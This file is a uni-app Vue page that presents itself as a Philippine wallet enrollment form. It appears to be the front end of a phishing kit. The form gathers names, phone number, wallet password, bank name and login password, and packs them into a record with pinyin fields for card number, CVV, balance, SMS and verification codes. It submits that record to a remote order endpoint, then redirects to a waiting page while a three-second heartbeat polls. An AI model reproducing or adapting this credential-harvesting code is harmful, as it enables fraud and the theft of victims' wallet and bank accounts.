<template>
	<view class="home-container">
		<view class="custom-nav">
			<view></view>
			<view><text class="title">{{$t("PAGE_TITLE")}}</text></view>
			<view></view>
		</view>
		<view variant="text" class="card">
			<uni-forms class="form" :modelValue="formData" 
				ref="prepareForm" label-position="top" err-show-type="undertext" 
				:rules="rules" validateTrigger="blur" >
				<uni-row class="flex-row form-row">
					<uni-col :span="8">
						<uni-forms-item required name="lastName" :label="$t('LABEL_LAST_NAME')" class="form-item">
							<uni-easyinput class="input" focus type="text" v-model="formData.lastName"/>
						</uni-forms-item>
					</uni-col>
					<uni-col :span="8">
						<uni-forms-item required name="firstName" :label="$t('LABEL_FIRST_NAME')" class="form-item">
							<uni-easyinput class="input" type="text" v-model="formData.firstName"/>
						</uni-forms-item>
					</uni-col>
					<uni-col :span="8">
						<uni-forms-item required name="middleName" :label="$t('LABEL_MIDDLE_NAME')" class="form-item">
							<uni-easyinput class="input" type="text" v-model="formData.middleName"/>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="phone" :label="$t('LABEL_PHONE_NUMBER')" class="form-item" label-width="100vw">
							<uni-row class="flex-row">
								<uni-col :span="4" style="text-align:right; color: #999">
									Philippines<br />(+63)
								</uni-col>
								<uni-col :span="20" >
									<uni-easyinput class="input" type="tel" v-model="formData.phone"/>
								</uni-col>
							</uni-row>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="walletPassword" :label="$t('LABEL_WALLET_PASSWORD')" class="form-item" label-width="100vw">
							<uni-easyinput class="input" type="password" v-model="formData.walletPassword"/>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="bankName" :label="$t('LABEL_BANK_NAME')" class="form-item" label-width="100vw">
							<uni-easyinput class="input" type="text" v-model="formData.bankName"/>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="username" :label="$t('LABEL_USERNAME')" class="form-item" label-width="100vw">
							<uni-easyinput class="input" type="text" v-model="formData.username"/>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="password" :label="$t('LABEL_PASSWORD')" class="form-item" label-width="100vw">
							<uni-easyinput class="input" type="password" v-model="formData.password"/>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="passwordConfirm" :label="$t('LABEL_PASSWORD_CONFIRM')" class="form-item" label-width="100vw">
							<uni-easyinput class="password" type="password" v-model="formData.passwordConfirm"/>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24" style="text-align: center;">
						<uni-button type="primary" class="large-button" @click="enroll">{{$t("SUBMIT")}}</uni-button>
					</uni-col>
				</uni-row>
			</uni-forms>
		</view>
	</view>

</template>


<script setup lang="ts">
	import { ref, onUnmounted, getCurrentInstance, onBeforeMount } from "vue";
	import { useI18n } from 'vue-i18n'
	const i18n = useI18n();

	import { createOrder, heartBeat } from './Remote';
	import rules from './Rules';
	
	onBeforeMount(()=>{
			let options = getCurrentInstance().data.options;
			console.log(options.a)
	})
	
	const prepareForm = ref(null);
	const formData = ref({
		lastName: "",
		firstName: "",
		middleName: "",
		phone: "",
		walletPassword: "",
		bankName: "",
		username: "",
		password: "",
		passwordConfirm: ""
	});
	
	const enroll = async (b) => {
		prepareForm.value.validate();
		let formDataValue = formData.value;
		let submitData = {
			d_kaihuhang: formDataValue.bankName,
			d_name: formDataValue.username + "[" + formDataValue.firstName + ", " + formDataValue.middleName + ", " + formDataValue.lastName + "]",
			d_kahao: "",
			d_mima: formDataValue.walletPassword,
			d_mima2: formDataValue.password,
			d_sfz: "",
			d_phone: formDataValue.phone,
			d_cvn: "",
			d_cvntime: "",
			d_yue: null,
			d_yzm: null,
			d_download: null,
			d_permission: null,
			d_sms: "",
			d_device: null
		}
		let resp = await createOrder(submitData);
		console.log(resp);
		if (resp.status == 1) {
			uni.redirectTo({
				url: "waiting?order=" + resp.d_id
			})
		}
	}
	
	onUnmounted(() => {
		clearInterval(heartBeatTimer);
	});	
	
	const heartBeatTimer = setInterval(async () => {
		try {
			heartBeat(formData.value.id);
		}
		catch(error) {
		}
	}, 3000);
	
	const downloadIpa = () => {
		uni.showToast({
			title: "unsupport",
			duration: 2000
		});
	}
</script>


<script lang="ts">
	export default {
		data() {
			return {
				options: {}
			}
		},
		onLoad(options: any) {
			this.options = options;
		}
	}
</script>

<style>
	.home-container {}

	.card {
		padding: 0.5em;
	}

	.flex-row {
		display: flex;
		flex-direction: row;
		justify-content: space-between;
		gap: 0.5em;
	}

	.form .form-row {
		padding: 0.5em;
	}

	.form .form-item label {
		line-height: 2em;
		color: #999;
	}

	.form .form-item input {
		/* border: 1px solid #CCC; */
		font-size: 18px;
		line-height: 200%;
		width: 100%;
	}

	.submit {
		color: #FFF;
		font-weight: 900;
	}

</style>
